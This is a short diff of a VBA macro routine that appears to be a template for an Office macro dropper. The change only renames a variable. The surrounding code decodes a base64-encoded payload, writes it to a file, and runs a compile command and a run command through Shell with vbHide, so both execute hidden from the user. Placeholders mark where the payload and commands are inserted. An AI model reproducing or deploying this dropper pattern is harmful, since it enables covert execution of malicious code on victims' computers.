@@ -89,9 +89,9 @@ Sub iDn()
     $$$ENCODED$$$
     oFile.Write Decode64(enc)
     oFile.Close
-    Dim compileCmd
+    Dim compCmd
     $$$COMPILE$$$
-    Call Shell(compileCmd, vbHide)
+    Call Shell(compCmd, vbHide)
     Dim runCmd
     $$$RUN$$$
     Call Shell(runCmd, vbHide)
